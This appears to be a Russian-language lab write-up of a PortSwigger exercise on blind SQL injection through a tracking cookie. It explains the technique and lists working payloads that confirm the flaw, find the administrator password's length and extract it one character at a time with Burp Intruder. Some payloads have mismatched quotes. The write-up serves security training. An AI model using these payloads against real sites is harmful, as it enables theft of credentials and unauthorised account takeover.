# Blind SQL injection with conditional responses

## Theory

<h3>Использование слепой инъекции SQL путем использования условных ответов</h3>

Рассмотрим приложение, которое использует отслеживающие файлы cookie для сбора аналитики об использовании. Запросы к приложению включают такой заголовок cookie:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Когда запрос, содержащий TrackingId cookie, обрабатывается, приложение определяет, является ли пользовать известным, с помощью SQL-запроса, подобного этому:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Этот запрос уязвим для внедрения SQL иньекции, но результаты запроса не возвращаются пользователю. Однако приложение ведет себя по-разному в зависимости от того, возвращает ли запрос какие-либо данные. Если он возвращает данные (поскольку был отправлен распознанный TrackingId), то на странице отображается сообщение «Welcome back».

Этого поведения достаточно, чтобы иметь возможность использовать уязвимость слепой инъекции SQL и извлекать информацию, вызывая различные ответы, в зависимости от введенного условия. Чтобы увидеть, как это работает, предположим, что два запроса отправлены по очереди, и содержат следующие значения TrackingId cookie:
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

Первое из этих значений приведет к тому, что запрос вернет результаты, поскольку введенное условие **AND '1'='1** истинно, и поэтому будет отображаться сообщение «Welcome back». Второе значение приведет к тому, что запрос не вернет никаких результатов, поскольку введенное условие является ложным, и поэтому сообщение «Welcome back» не будет отображаться. Это позволяет нам определить ответ на любое введенное условие и, таким образом, извлекать данные по одному биту за раз.

Например, предположим, что есть таблица **Users** со столбцами **Username** и **Password** и пользователь с именем «Administrator». Мы можем определять пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.

Для этого начнем со следующего запроса:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Этот запрос возвращает сообщение «Welcome back», указывающее, что введенное условие истинно, и поэтому первый символ пароля больше, чем m.

Далее мы отправляем следующий запрос:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Этот запрос не возвращает сообщение «Welcome back», значит введенное условие ложно, поэтому первый символ пароля меньше t.

Теперь мы отправляем следующий запрос, который возвращает сообщение «Welcome back», тем самым подтверждая, что первый символ пароля — s:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/1.png)

Выбираем пункт Lifestyle. Отправим запрос, чтобы удостовериться, что страница уязвима к SQL-иньекции, и что страница возвращает сообщение «Welcome back».
```
0zI'+AND+1=1--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/2.png)

Проверим, существует ли таблица Users:
```
0zI'+AND+(SELECT+'x'+FROM+users+LIMIT+1)='x'--;
```

* Оператор SQL LIMIT позволяет вывести указанное число строк из таблицы

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/3.png)

Убедимся, что в таблице Users есть пользователь с именем Administrator:
```
0zI'+AND+(SELECT+username+FROM+users+WHERE+username='administrator)='administrator'--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/4.png)

Следующим шагом является определение количества символов в пароле пользователя Administrator. Изменяя число LENGTH(password)>**1** узнаем, что длина пароля равна 20 символам.
```
0zI'+AND+(SELECT+username+FROM+users+WHERE+username='administrator+AND+LENGTH(password)>1)='administrator'--;
```

* Функция LENGTH используется для подсчета количества символов в строках

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/5.png)

После определения длины пароля следующим шагом будет проверка символа в каждой позиции, чтобы определить его значение. Отправляем запрос в Burp Intruder и заключаем нужные нам значения для перебора в специальные символы. В фильтре выбираем поиск по слову. Получаем пароль.
```
0zI'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a--;
```

* Функция SUBSTRING вырезает и возвращает заданное количество символов из строки. Первым параметром функция принимает поле или строку, вторым параметром - с какой позиции начинать вырезания (нумерация символов начинается с 1), третьем параметром - сколько символов брать. Третий параметр не является обязательным. Если он не указан, текст будет вырезан с указанной позиции и до конца строки.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/6.png)

Логинимся под администратора и получаем ответ от приложения

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_conditional_responses/assets/7.png)
